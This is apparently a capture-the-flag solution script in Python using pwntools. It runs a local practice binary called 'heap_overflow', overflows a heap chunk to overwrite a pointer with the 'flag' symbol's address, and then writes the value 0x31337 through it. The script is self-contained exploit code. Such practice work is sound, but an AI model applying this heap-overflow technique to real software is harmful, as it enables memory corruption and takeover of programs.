from pwn import *

elf = ELF("./heap_overflow")

p = elf.process()
gdb.attach(p) 

def create():
    p.sendlineafter(b"> ", b"1")

def insert(idx, data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", idx)
    p.sendlineafter(b"> ", data)

def modify(idx, data):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", idx)
    p.sendlineafter(b"> ", data)


create()
insert(b"0", b"asdf")
create()

payload = b""
payload += b"A" * 0x20
payload += p64(elf.sym["flag"])
modify(b"0", payload)

# modify(b"1", b"31337") # 문자열로 들어가짐 -> 0x373331
modify(b"1", p32(0x31337))

p.interactive()